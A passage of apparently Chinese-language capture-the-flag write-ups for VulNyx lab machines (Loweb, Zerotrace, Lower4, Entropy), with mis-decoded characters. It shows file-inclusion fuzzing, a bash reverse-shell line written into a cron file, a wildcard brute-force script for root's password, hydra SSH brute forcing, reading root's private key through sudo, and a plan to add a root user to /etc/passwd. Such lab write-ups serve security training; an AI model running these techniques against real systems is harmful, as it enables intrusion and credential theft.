\u0026#39;nc\\|netcat\\|ncat\\|bash\\|sh\u0026#39; | grep -v grep \u0026gt;\u0026gt; $LOGFILE\recho -e \u0026#34;\\n=== Monitoring finished: $(date) ===\u0026#34; \u0026gt;\u0026gt; $LOGFILE åˆšå¥½åœ¨é‡Œé¢å‘ç°äº†å¯†ç ï¼šcontraseÃ±aconÃ‘jeje\nä½†æ˜¯ä¸èƒ½è¯»å–user.txt\næŸ¥çœ‹ç‰¹æ®Šæƒé™å‘½ä»¤ï¼Œå¯ä»¥åˆ©ç”¨chown\nr3dh4ck@loweb:~$ sudo -l\rMatching Defaults entries for r3dh4ck on loweb:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\rUser r3dh4ck may run the following commands on loweb:\r(ALL) NOPASSWD: /usr/bin/chown Root #\rå¯ä»¥ç›´æ¥è¯»å–\nå’Œè¿™ç¯‡æ–‡ç« ç±»ä¼¼çš„ğŸ‘‡ï¼Œå¯ä»¥ä¿®æ”¹**/etc/passwdæ·»åŠ ä¸€ä¸ªroot**ç»„ç”¨æˆ·\nDockerlabs-r00tless - HYH Summary #\rUserï¼šä»»æ„æ–‡ä»¶åŒ…å«ï¼Œé€šè¿‡filterchainsæ‹¿åˆ°www-dataï¼Œåœ¨å®šæ—¶ä»»åŠ¡ä¸­å¾—åˆ°ç”¨æˆ·å¯†ç ã€‚\nRootï¼šç”±äºç‰¹æ®Šæƒé™çš„å‘½ä»¤æ˜¯chownï¼Œè¿™ä¸ªå‘½ä»¤å‡ ä¹å¯ä»¥æŸ¥çœ‹ä»»ä½•æ–‡ä»¶ï¼Œå› æ­¤å°±æ˜¾å¾—ååˆ†ç®€å•ã€‚å¯ä»¥ä¿®æ”¹**/etc/passwdçš„ç”¨æˆ·åˆ—è¡¨ï¼Œæ·»åŠ ä¸€ä¸ªroot**ç»„ç”¨æˆ·ã€‚\n","date":"2025-03-17","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-loweb/","section":"Posts","summary":"","title":"VulNyx-Loweb","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali â¯ nmap 192.168.56.119 -sV -A PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)\r|_ 256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)\r80/tcp open http nginx 1.22.1\r|_http-server-header: nginx/1.22.1\r|_http-title: Massively by HTML5 UP\r8000/tcp open ftp pyftpdlib 1.5.7\r| ftp-syst: | STAT: | FTP server status:\r| Connected to: 192.168.56.119:8000\r| Waiting for username.\r| TYPE: ASCII; STRUcture: File; MODE: Stream\r| Data connection closed.\r|_End of status. Dirsearch #\r[root@kali] /home/kali/Zerotrace â¯ dirsearch -u http://192.168.56.119 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Zerotrace/reports/http_192.168.56.119/_25-03-15_19-12-30.txt\rTarget: http://192.168.56.119/\r[19:12:30] Starting: [19:12:30] 301 - 169B - /.admin -\u0026gt; http://192.168.56.119/.admin/ [19:12:30] 403 - 555B - /.admin/\r[19:12:31] 403 - 555B - /.ht_wsr.txt [19:12:31] 403 - 555B - /.htaccess.bak1 [19:12:31] 403 - 555B - /.htaccess.orig [19:12:31] 403 - 555B - /.htaccess.sample\r[19:12:31] 403 - 555B - /.htaccess.save\r[19:12:31] 403 - 555B - /.htaccess_extra [19:12:31] 403 - 555B - /.htaccess_orig\r[19:12:31] 403 - 555B - /.htaccess_sc\r[19:12:31] 403 - 555B - /.htaccessOLD\r[19:12:31] 403 - 555B - /.htaccessBAK\r[19:12:31] 403 - 555B - /.htaccessOLD2 [19:12:31] 403 - 555B - /.htm\r[19:12:31] 403 - 555B - /.html [19:12:31] 403 - 555B - /.httr-oauth [19:12:31] 403 - 555B - /.htpasswds [19:12:31] 403 - 555B - /.htpasswd_test [19:12:37] 301 - 169B - /assets -\u0026gt; http://192.168.56.119/assets/ [19:12:37] 403 - 555B - /assets/ [19:12:43] 403 - 555B - /images/ [19:12:43] 301 - 169B - /images -\u0026gt; http://192.168.56.119/images/\r[19:12:44] 200 - 17KB - /LICENSE.txt [19:12:50] 200 - 930B - /README.txt [19:12:54] 403 - 555B - /uploads/ [19:12:54] 403 - 555B - /uploads/affwp-debug.log [19:12:54] 403 - 555B - /uploads/dump.sql Task Completed å‘ç°å­˜åœ¨ä¸€ä¸ª**/.admin**ç›®å½•\nGobuster #\r[root@kali] /home/kali/Zerotrace â¯ gobuster dir -u http://192.168.56.119/.admin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://192.168.56.119/.admin\r[+] Method: GET\r[+] Threads: 10\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html,txt\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/.html (Status: 403) [Size: 153]\r/tool.php (Status: 200) [Size: 0]\r/.html (Status: 403) [Size: 153]\rProgress: 882240 / 882244 (100.00%)\r===============================================================\rFinished\r=============================================================== å‘ç°ä¸€ä¸ªtool.php\nFFUF #\rç›´æ¥è®¿é—®æ²¡æœ‰å›æ˜¾ï¼Œå°è¯•å¯¹å‚æ•°è¿›è¡Œçˆ†ç ´\n[root@kali] /home/kali/Zerotrace â¯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?FUZZ=/etc/passwd\u0026#34; -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?FUZZ=/etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\rfile [Status: 200, Size: 1163, Words: 5, Lines: 25, Duration: 8ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 5263 req/sec :: Duration: [0:00:15] :: Errors: 0 :: å½“å‚æ•°æ˜¯fileæ—¶æœ‰å›æ˜¾ï¼ŒæŸ¥çœ‹å†…å®¹\n[root@kali] /home/kali/Zerotrace â¯ curl \u0026#34;http://192.168.56.119/.admin/tool.php?file=/etc/passwd\u0026#34; â\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rmessagebus:x:100:107::/nonexistent:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rll104567:x:1000:1000::/home/ll104567:/bin/bash\rJ4ckie0x17:x:1002:1002:,,,:/home/J4ckie0x17:/bin/bash\rshelldredd:x:1003:1003::/home/shelldredd:/bin/bash æŸ¥çœ‹åˆ°å­˜åœ¨ä¸‰ä¸ªç”¨æˆ·ï¼šll104567ã€J4ckie0x17ã€shelldredd\nOwn J4ckie0x17 #\rå°è¯•ä½¿ç”¨LFIçš„å­—å…¸è¿›è¡Œæ‰«æ\n[root@kali] /home/kali/Zerotrace â¯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?file=FUZZ\u0026#34; -w /usr/share/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -fs 0\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?file=FUZZ\r:: Wordlist : FUZZ: /usr/share/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\r/etc/passwd [Status: 200, Size: 1163, Words: 5, Lines: 25, Duration: 4ms]\r:: Progress: [9513/9513] :: Job [1/1] :: 5128 req/sec :: Duration: [0:00:02] :: Errors: 0 :: æ²¡æœ‰ä»»ä½•ä¸œè¥¿ï¼Œå»çœ‹äº†ä¸€ä¸‹writeupï¼Œå‘ç°åŸæ¥æ˜¯**/proc/{id}/cmdline**\ncmdline æ–‡ä»¶å­˜å‚¨ç€å¯åŠ¨å½“å‰è¿›ç¨‹çš„å®Œæ•´å‘½ä»¤ï¼Œä½†åƒµå°¸è¿›ç¨‹ç›®å½•ä¸­çš„æ­¤æ–‡ä»¶ä¸åŒ…å«ä»»ä½•ä¿¡æ¯ã€‚å¯ä»¥é€šè¿‡æŸ¥çœ‹cmdlineç›®å½•è·å–å¯åŠ¨æŒ‡å®šè¿›ç¨‹çš„å®Œæ•´å‘½ä»¤\nå¯ä»¥çœ‹åˆ°**/proc/1/cmdline**æ˜¯æœ‰å›æ˜¾çš„ã€‚\nå› æ­¤å¯ä»¥éå†ä¸€ä¸‹å…¶ä»–çš„PID\n[root@kali] /home/kali/Zerotrace â¯ seq 1 10000 \u0026gt; numbers.txt â\r[root@kali] /home/kali/Zerotrace â¯ ffuf -u \u0026#34;http://192.168.56.119/.admin/tool.php?file=/proc/FUZZ/cmdline\u0026#34; -w ./numbers.txt -fs 0 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://192.168.56.119/.admin/tool.php?file=/proc/FUZZ/cmdline\r:: Wordlist : FUZZ: /home/kali/Zerotrace/numbers.txt\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 40\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 0\r________________________________________________\r1 [Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 2ms]\r208 [Status: 200, Size: 30, Words: 1, Lines: 1, Duration: 9ms]\r231 [Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 9ms]\r375 [Status: 200, Size: 140, Words: 1, Lines: 1, Duration: 8ms]\r457 [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 9ms]\r458 [Status: 200, Size: 105, Words: 1, Lines: 1, Duration: 9ms]\r461 [Status: 200, Size: 78, Words: 4, Lines: 1, Duration: 9ms]\r463 [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 9ms]\r465 [Status: 200, Size: 28, Words: 1, Lines: 1, Duration: 9ms]\r469 [Status: 200, Size: 120, Words: 12, Lines: 1, Duration: 9ms]\r472 [Status: 200, Size: 109, Words: 1, Lines: 1, Duration: 9ms]\r474 [Status: 200, Size: 71, Words: 9, Lines: 1, Duration: 9ms]\r475 [Status: 200, Size: 43, Words: 3, Lines: 1, Duration: 9ms]\r480 [Status: 200, Size: 56, Words: 8, Lines: 1, Duration: 9ms]\r482 [Status: 200, Size: 49, Words: 3, Lines: 1, Duration: 9ms]\r1504 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1505 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1506 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 8ms]\r1602 [Status: 200, Size: 78, Words: 3, Lines: 1, Duration: 9ms]\r:: Progress: [10000/10000] :: Job [1/1] :: 5000 req/sec :: Duration: [0:00:02] :: Errors: 0 :: å¯ä»¥çœ‹åˆ°PIDä¸º469çš„æ—¶å€™å“åº”ä½“æœ€å¤§ï¼ŒæŸ¥çœ‹ä¸€ä¸‹\nå¾—åˆ°ç”¨æˆ·çš„å¯†ç \nJ4ckie0x17:uhIpiRnUBwAHaG.EkeN-oKUfozESUnx3zCIxpuhAd Own shelldredd #\rç™»å½•åæŸ¥çœ‹å®šæ—¶ä»»åŠ¡\nè¿™ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…æ˜¯shelldreddï¼Œä½†æ˜¯å°½ç®¡æœ‰wå¯å†™æƒé™ï¼Œä½†æ˜¯è¢«chattar+iè®¾ç½®äº†ä¸å¯ä¿®æ”¹\næŸ¥æ‰¾ä¸€ä¸‹SUIDæ–‡ä»¶ï¼Œåˆšå¥½å­˜åœ¨chattar\nfind / -user root -perm -4000 -print 2\u0026gt;/dev/null åªéœ€è¦å»æ‰ä¸å¯ä¿®æ”¹çš„ä¿®é¥°ç¬¦å°±è¡Œäº†\nJ4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ /usr/bin/chattr -i destiny J4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ rm destiny J4ckie0x17@zerotrace:/opt/.nobodyshouldreadthis$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.56.118/6666 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; destiny å†™å…¥å…¬é’¥åsshè¿æ¥\nOwn ll104567 #\ræŸ¥çœ‹**/opt/cryptovault/ll104567**ç›®å½•ä¸‹çš„å†…å®¹\nshelldredd@zerotrace:/opt/cryptovault/ll104567$ cat notes.txt æˆ‘è¦åœ¨è¿™é‡Œå†™ä¸‹æˆ‘çš„æ„¿æœ›ï¼š\råœ¨10ç§’å†…å®Œæˆé­”æ–¹\rè®©The Flashï¼ˆé—ªç”µä¾ ï¼‰è·‘å¾—æ›´æ…¢\råœ¨å“”å“©å“”å“©ä¸Šè¾¾åˆ°1000ä¸ªè§†é¢‘\rshelldredd@zerotrace:/opt/cryptovault/ll104567$ cat secret {\u0026#34;address\u0026#34;:\u0026#34;2891efcaa457d4d44dc724c4fa015fe8be4e279e\u0026#34;,\u0026#34;crypto\u0026#34;:{\u0026#34;cipher\u0026#34;:\u0026#34;aes-128-ctr\u0026#34;,\u0026#34;ciphertext\u0026#34;:\u0026#34;fee023fd8fcd5b242b0ad4900de2d4614fa4be48887efbd6208a9beb65923df7\u0026#34;,\u0026#34;cipherparams\u0026#34;:{\u0026#34;iv\u0026#34;:\u0026#34;7183f2eea51e68d818fe976daf18327d\u0026#34;},\u0026#34;kdf\u0026#34;:\u0026#34;scrypt\u0026#34;,\u0026#34;kdfparams\u0026#34;:{\u0026#34;dklen\u0026#34;:32,\u0026#34;n\u0026#34;:262144,\u0026#34;p\u0026#34;:1,\u0026#34;r\u0026#34;:8,\u0026#34;salt\u0026#34;:\u0026#34;abb71ccb91d0ec97831d49694bd80ce925c0204772fa6268ace1f73df97e3d71\u0026#34;},\u0026#34;mac\u0026#34;:\u0026#34;4ed5177b17ad85eafafd3dedc40a3c85914d18611c2cca079871a28487055892\u0026#34;},\u0026#34;id\u0026#34;:\u0026#34;0c431e07-6087-4368-a973-ed3fb4ec5045\u0026#34;,\u0026#34;version\u0026#34;:3}\rshelldredd@zerotrace:/home/ll104567$ cat one Why don\u0026#39;t we join two universes and see who\u0026#39;s the strongest?\rsaitama\rgenos\rmumen\rspeed-o\rfubuki\rbang\rtatsumaki\rboros\rdrkuseno\ronepunchman\rkarin\rzombieman\rchildemperor\rstinger ç»è¿‡æœç´¢secretæ˜¯ä¸€ä¸ª Ethereum é’±åŒ…æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶é€šå¸¸ç”¨äºä¿å­˜åŠ å¯†çš„ç§é’¥ï¼Œåªæœ‰é€šè¿‡æ­£ç¡®çš„å¯†ç æ‰èƒ½è§£å¯†å¹¶è·å–ç§é’¥ã€‚ä½†æ˜¯è¿™é‡Œä¸æ˜¯è¿™ä¸ªè€ƒç‚¹ã€‚\næ³¨æ„ï¼ï¼ï¼ï¼ï¼\nè¿™é‡Œæœ‰ä¸ªéšè—çš„ä¸œè¥¿ï¼Œå°±æ˜¯oneé‡Œé¢çš„å†…å®¹æ˜¯ä¸€æ‹³è¶…äººçš„è§’è‰²åï¼Œæåˆ°çš„ä¸¤ä¸ªå®‡å®™ä¸­çš„å¦ä¸€ä¸ªå®‡å®™å°±æ˜¯é¾™ç ï¼ˆdragonballzï¼‰ï¼Œå› æ­¤éœ€è¦å°†åœ¨å‰é¢ç»Ÿä¸€åŠ ä¸Šdragonballzçš„å‰ç¼€ã€‚\nRoot #\ræŸ¥çœ‹guessmeçš„å†…å®¹\nll104567@zerotrace:~$ cat guessme #!/bin/bash\rFTP_USER=\u0026#34;admin\u0026#34;\rFTP_PASS=$(cat /root/.creds)\recho -n \u0026#34;Please provide the password for $FTP_USER: \u0026#34;\rread -s INPUT_PASS\recho\rCLEAN_PASS=$(echo \u0026#34;$INPUT_PASS\u0026#34; | sed \u0026#39;s/[[:space:]]//g\u0026#39;)\rif [[ $FTP_PASS == $CLEAN_PASS ]]; then\recho \u0026#34;Password matches!\u0026#34;\rexit 0\relse\recho \u0026#34;Access denied!\u0026#34;\rexit 1\rfi è¾“å…¥é‚£é‡Œï¼Œæœ‰ä¸€ä¸ªsedå»æ‰ç©ºç™½å­—ç¬¦ã€‚\nè¿™é‡Œä¸»è¦è€ƒå¯Ÿçš„æ˜¯Linuxé‡Œçš„**é€šé…ç¬¦(?)**åŒ¹é…\nå…ˆå†™ä¸ªè„šæœ¬æ¥æ£€æµ‹æœ‰å¤šå°‘ä½\nfor i in {1..100}; do # åˆ›å»ºä¸€ä¸ªç”± i ä¸ª ? ç»„æˆçš„å­—ç¬¦ä¸²\rpattern=$(printf \u0026#34;?%.0s\u0026#34; $(seq 1 $i))\r# æ˜¾ç¤ºå½“å‰æ­£åœ¨å°è¯•çš„é•¿åº¦\recho \u0026#34;Trying password with length $i: $pattern\u0026#34;\r# ä½¿ç”¨é€šé…ç¬¦å±•å¼€ï¼Œå°è¯•å½“å‰é•¿åº¦çš„å¯†ç \recho $pattern | sudo /bin/bash /home/ll104567/guessme # å¦‚æœå¯†ç åŒ¹é…ï¼Œé€€å‡ºå¾ªç¯\rif [ $? -eq 0 ]; then\recho \u0026#34;Password with length $i is correct!\u0026#34;\rbreak\rfi\rdone å‘ç°å¯†ç ä¸€å…±æœ‰49ä½ã€‚ç±»ä¼¼äºSQLæ³¨å…¥çš„æ–¹å¼ï¼Œå…ˆç”¨49ä¸ªé€šé…ç¬¦ï¼Œç„¶åé€ä¸€æµ‹è¯•ã€‚\n#!/bin/bash\rcharset=\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\u0026#34;\r# å¯†ç é•¿åº¦\rpassword_length=49\r# åˆå§‹åŒ–å¯†ç ä¸º49ä¸ªé—®å·\rcurrent_password=$(printf \u0026#34;%-${password_length}s\u0026#34; \u0026#34;?\u0026#34; | tr \u0026#39; \u0026#39; \u0026#39;?\u0026#39;)\r# æš´åŠ›ç ´è§£æ¯ä¸ªå­—ç¬¦\rfor i in $(seq 1 $password_length); do\r# éå†å­—ç¬¦é›†ï¼Œæš´åŠ›ç ´è§£å½“å‰å­—ç¬¦ä½ç½®\rfor char in $(echo $charset | sed \u0026#39;s/./\u0026amp; /g\u0026#39;); do\r# æ›¿æ¢å¯†ç ä¸­å½“å‰ä½ç½®çš„å­—ç¬¦\rcurrent_password=\u0026#34;${current_password:0:$i-1}$char${current_password:$i}\u0026#34;\r# ä½¿ç”¨ guessme è„šæœ¬æµ‹è¯•å½“å‰å¯†ç \rresult=$(echo $current_password | sudo /bin/bash /home/ll104567/guessme)\r# å¦‚æœå¯†ç åŒ¹é…ï¼Œè¾“å‡ºç»“æœå¹¶ç»§ç»­åˆ°ä¸‹ä¸€ä¸ªå­—ç¬¦\rif [[ $result == *\u0026#34;Password matches!\u0026#34;* ]]; then\recho \u0026#34;Current correct password: $current_password\u0026#34;\rbreak\rfi\rdone\rdone\recho \u0026#34;Password is correct: $current_password\u0026#34; ç„¶åæ‹¿åˆ°root\nSummary #\rUserï¼šç›®å½•æ‰«æï¼Œå‚æ•°çˆ†ç ´ï¼Œè¯»å–åˆ°**/proc/pid/cmdlineè¿›ç¨‹å‚æ•°æ–‡ä»¶ï¼Œå¾—åˆ°J4ckie0x17æƒé™ã€‚é€šè¿‡chattrå–æ¶ˆæ‰ä¸å¯ä¿®æ”¹çš„æ–‡ä»¶ï¼Œå†™å…¥åå¼¹shell**ï¼Œå¾—åˆ°shelldreddçš„æƒé™ã€‚æœ€åé€šè¿‡ç•™è¨€ï¼Œè¿›è¡ŒçŒœæµ‹æ‹¼æ¥ï¼Œè¿›è¡Œsshçˆ†ç ´ç™»å½•ï¼Œæ‹¿åˆ°ll104567ã€‚\nRootï¼šåœ¨Linuxç³»ç»Ÿä¸­ï¼Œ( ? )é—®å·æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œç”¨äºåŒ¹é…å•ä¸ªå­—ç¬¦ã€‚è¿™é‡Œé€šè¿‡å¯¹æ¯ä¸€ä½è¿›è¡Œå°è¯•çˆ†ç ´ï¼Œæœ€ç»ˆå¾—åˆ°rootçš„å¯†ç ã€‚\n","date":"2025-03-16","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-zerotrace/","section":"Posts","summary":"","title":"VulNyx-Zerotrace","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Low Nmap #\r[root@kali] /home/kali/Lower4 â¯ nmap 192.168.56.120 -sV -A PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\r| ssh-hostkey: | 3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)\r| 256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)\r|_ 256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)\r|_auth-owners: root\r80/tcp open http Apache httpd 2.4.56 ((Debian))\r|_http-server-header: Apache/2.4.56 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\r113/tcp open ident?\r|_auth-owners: lucifer\rMAC Address: 08:00:27:DE:A3:91 (Oracle VirtualBox virtual NIC)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ä»113ç«¯å£ä¸Šæ‰«æåˆ°ä¸€ä¸ªç”¨æˆ·åï¼šlucifer\nå°è¯•ä½¿ç”¨sshçˆ†ç ´\nHydra #\r[root@kali] /home/kali/Lower4 â¯ hydra -l lucifer -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.120 -I â\rHydra v9.5 (c) 2023 by van Hauser/THC \u0026amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\rHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-15 20:10:43\r[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\r[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task\r[DATA] attacking ssh://192.168.56.120:22/\r[STATUS] 227.00 tries/min, 227 tries in 00:01h, 14344178 to do in 1053:11h, 11 active\r[22][ssh] host: 192.168.56.120 login: lucifer password: 789456123\r1 of 1 target successfully completed, 1 valid password found\r[WARNING] Writing restore file because 5 final worker threads did not complete until end.\r[ERROR] 5 targets did not resolve or could not be connected\r[ERROR] 0 target did not complete\rHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-15 20:12:07 å¾—åˆ°å¯†ç æ˜¯789456123\nRoot #\ræŸ¥çœ‹ç‰¹æ®Šå‘½ä»¤\nlucifer@lower4:~$ sudo -l\rMatching Defaults entries for lucifer on lower4:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\rUser lucifer may run the following commands on lower4:\r(root) NOPASSWD: /usr/bin/multitail å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªå‘½ä»¤æŸ¥çœ‹sshç§é’¥\nlucifer@lower4:~$ sudo /usr/bin/multitail /root/.ssh/id_rsa ä¹Ÿå¯ä»¥ä½¿ç”¨**-lå‚æ•°è¿›è¡Œæ‰§è¡Œå‘½ä»¤ï¼Œä½†è¿™é‡Œæ— æ³•æ­£å¸¸å¼€å§‹bash**ï¼Œéœ€è¦é—´æ¥æ‰§è¡Œã€‚\nSummary #\ræ¯”è¾ƒç®€å•çš„ä¸€ä¸ªé¶æœºï¼ŒNmapæ³„éœ²å‡ºç”¨æˆ·åï¼Œç„¶åçˆ†ç ´ç™»å½•æ‹¿åˆ°userã€‚é€šè¿‡multitailçš„ç›´æ¥è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œæå‡åˆ°rootã€‚\n","date":"2025-03-15","externalUrl":null,"permalink":"/posts/2025/03/vulnyx-lower4/","section":"Posts","summary":"","title":"VulNyx-Lower4","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Entropy â¯ nmap 192.168.56.117 -sV -A -p- PORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\r| ssh-hostkey: | 256 cc:05:ab:8c:ea:28:eb:b1:9d:da:8c:ce:65:ee:63:43 (ECDSA)\r|_ 256 3f:9f:0a:7d:61:f8:6f:4b:46:01:c4:db:74:b2:b6:a7 (ED25519)\r80/tcp open http Apache httpd 2.4.62 ((Debian))\r|_http-server-header: Apache/2.4.62 (Debian)\r|_http-title: Apache2 Debian Default Page: It works ç›®å½•æ‰«ææ²¡æœ‰ä»»ä½•ç»“æœï¼Œåœ¨apacheé»˜è®¤é¡µä¸­å‘ç°è·¯å¾„\nSQL Injection #\rè¿›å…¥ä¹‹åæŸ¥çœ‹åˆ°å½“å‰ç‰ˆæœ¬æ˜¯ï¼š2.2.9.1\næŸ¥æ‰¾ä¸€ä¸‹æ¼æ´åˆšå¥½æœ‰ï¼Œä¸è¿‡è¿™ä¸ªè„šæœ¬æ˜¯python2å†™çš„ï¼Œè¿˜æ˜¯å»æ‰¾æ‰¾ç½‘ä¸Šçš„ã€‚\nAzrenom/CMS-Made-Simple-2.2.9-CVE-2019-9053 ç”±äºå¯†ç æ˜¯MD5åŠ å¯†çš„ï¼Œè€Œä¸”å·²ç»æœ‰ç›å€¼äº†ï¼Œå°è¯•è§£å¯†ä¸€ä¸‹ã€‚\næ³¨æ„ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼\nè¿™é‡Œæœ‰ä¸ªå‘ï¼Œå°±æ˜¯å¯†ç ä¸åœ¨rockyou.txtä¸­ã€‚æ¯”è¾ƒç²—æš´çš„æ–¹æ³•å°±æ˜¯ï¼ŒæŠŠæ‰€æœ‰å¯†ç 